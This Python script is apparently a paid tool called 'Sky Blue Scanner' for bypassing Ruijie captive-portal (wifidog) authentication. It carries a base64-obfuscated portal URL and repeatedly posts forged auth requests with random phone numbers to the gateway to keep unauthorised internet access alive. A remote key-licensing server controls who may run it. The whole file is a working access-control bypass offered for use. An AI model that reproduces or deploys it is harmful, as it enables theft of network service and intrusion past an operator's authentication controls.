import os
import time
import random
import string
import asyncio
import aiohttp
import ping3
import base64
import requests
import threading
import re
import sys
import urllib3
from datetime import datetime

# --- Color Codes ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"
B_CYAN = "\033[1;36m"
B_GREEN = "\033[1;32m"
B_RED = "\033[1;31m"
CYAN = "\033[0;36m"
WHITE = "\033[1;37m"

# --- Configuration for Key System ---
RENDER_URL = "https://ytun-keybot.onrender.com" 
KEY_URL = f"{RENDER_URL}/api/keys"
STATUS_URL = f"{RENDER_URL}/api/status"
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")

# ===============================
# KEY SYSTEM FUNCTIONS
# ===============================
def get_system_key():
    try: 
        uid = os.getuid() if hasattr(os, 'getuid') else 1000
    except: 
        uid = 1000
    try: 
        username = os.getlogin()
    except: 
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def check_status():
    try:
        res = requests.get(f"{STATUS_URL}?t={time.time()}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            if data.get("script", {}).get("status") != "ON":
                print(f"\n{B_RED}[❌] SCRIPT IS CURRENTLY OFFLINE / DISABLED{w}")
                return False
        return True
    except:
        return True

def fetch_authorized_keys():
    keys = []
    expirations = {}
    try:
        response = requests.get(f"{KEY_URL}?t={time.time()}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            keys = data.get("keys", [])
            expirations = data.get("expirations", {})
            
            save_data = []
            for k in keys:
                exp = expirations.get(k, 0)
                save_data.append(f"{k}|{exp}")
                
            with open(LOCAL_KEYS_FILE, 'w') as f: 
                f.write('\n'.join(save_data))
            return keys, expirations
    except:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    parts = line.strip().split('|')
                    if len(parts) == 2:
                        keys.append(parts[0])
                        expirations[parts[0]] = float(parts[1])
                    elif len(parts) == 1 and parts[0]: 
                        keys.append(parts[0])
                        expirations[parts[0]] = 0
            return keys, expirations
    return keys, expirations

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{w}")
    print(f"{B_CYAN}            SKY BLUE SCANNER - PROTECTED          {w}")
    print(f"{B_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{w}")
    
    if not check_status():
        return False
        
    my_key = get_system_key()
    approved_keys, expirations = fetch_authorized_keys()
    
    if my_key in approved_keys:
        exp_time = expirations.get(my_key, 0)
        if exp_time > 0 and time.time() > exp_time:
            print(f"\n{B_RED}[❌] ACCESS DENIED: သင်၏ Key သက်တမ်းကုန်သွားပါပြီ။{w}")
            print(f"Contact Admin: @Kenobe21")
            return False
            
        print(f"\n{B_GREEN}[✓] ACCESS GRANTED!{w}")
        return True
    else:
        print(f"\n{B_RED}[❌] ACCESS DENIED{w}")
        print(f"Contact Admin: @Kenobe21")
        print(f"Your Key: {B_CYAN}{my_key}{w}")
        return False

def continuous_auth_check():
    while True:
        time.sleep(60) 
        if not check_status():
            os._exit(0) 
            
        my_key = get_system_key()
        approved_keys, expirations = fetch_authorized_keys()
        
        if my_key not in approved_keys:
            print(f"\n\n{B_RED}[❌] ACCESS REVOKED! သင်၏ Key ပယ်ဖျက်ခံလိုက်ရပါသည်။{w}\n")
            os._exit(0) 
            
        exp_time = expirations.get(my_key, 0)
        if exp_time > 0 and time.time() > exp_time:
            print(f"\n\n{B_RED}[❌] ACCESS EXPIRED! သင်၏ Key သက်တမ်းကုန်သွားပါပြီ{w}\n")
            os._exit(0)

# ===============================
# INTERNET ACCESS CLASS
# ===============================
class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try:
            self.ip = open(".ip", "r").read().strip()
        except:
            self.ip = "192.168.99.1"

    async def get_session_id(self, session, session_url, previous_id=None):
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        try:
            async with session.get(session_url, headers=headers, timeout=10) as req:
                response = str(req.url)
                import re
                session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
                return session_id
        except:
            return previous_id

    async def execute(self):
        print(f"{g}[+] Internet Access Keep-Alive Mode Running...{w}")
        async with aiohttp.ClientSession() as session:
            loop = 0
            session_id = None
            while True:
                if loop % 5 == 0:
                    session_id = await self.get_session_id(session, self.session_url, session_id)
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    try:
                        async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params) as res:
                            p = await asyncio.to_thread(ping3.ping, 'google.com')
                            ping_str = f"{g}{int(p*1000)}ms" if p else f"{r}Offline"
                            print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Status: {res.status} | Ping: {ping_str}")
                    except: 
                        pass
                await asyncio.sleep(2)
                loop += 1

if __name__ == "__main__":
    if check_approval():
        # continuous_auth_check သို့ အမှန်ပြင်ထားပါသည်
        threading.Thread(target=continuous_auth_check, daemon=True).start()
        
        try:
            asyncio.run(InternetAccess().execute())
        except KeyboardInterrupt:
            print(f"\n{r}[!] Stopped.{w}")
    else:
        sys.exit()
